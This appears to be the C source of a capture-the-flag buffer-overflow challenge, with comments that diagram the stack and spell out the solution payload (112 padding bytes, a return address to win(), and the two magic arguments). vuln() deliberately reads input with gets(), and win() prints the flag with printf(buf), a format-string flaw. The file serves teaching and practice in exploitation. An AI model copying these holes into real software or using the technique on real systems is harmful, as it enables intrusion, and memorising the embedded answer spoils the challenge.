#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

/** +--------+ */
/** |  EBP   | */
/** +--------+ */
/** |  RET   |   <- this will be replaced by EBP of win */   
/** +--------+ */
/** |padding |   <- fake ret of win
/** +--------+ */
/** | argv1  | <- CAFEF00D EBP + 8 */
/** +--------+ */
/** | argv2  | <- F00DF00D EBp + 0xc */
/** +--------+*/

//  padding = "A"*112 sizeof( buffer + padding stack + ebp )
//  ret = "\x96\x92\x04\x08"
//  padding_2 = "A"*4
//  argv1 = "\x0d\xf0\xfe\xca"
//  argv2 = "\x0d\xf0\x0d\xf0"


void vuln(){ 								// overwrite this (ebp) 4 bytes, overwrite ret, ret will be hold addresss of win and write 12 bytes
  char buf[BUFSIZE];     					// 100 bytes
  gets(buf); 								// fill up this
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

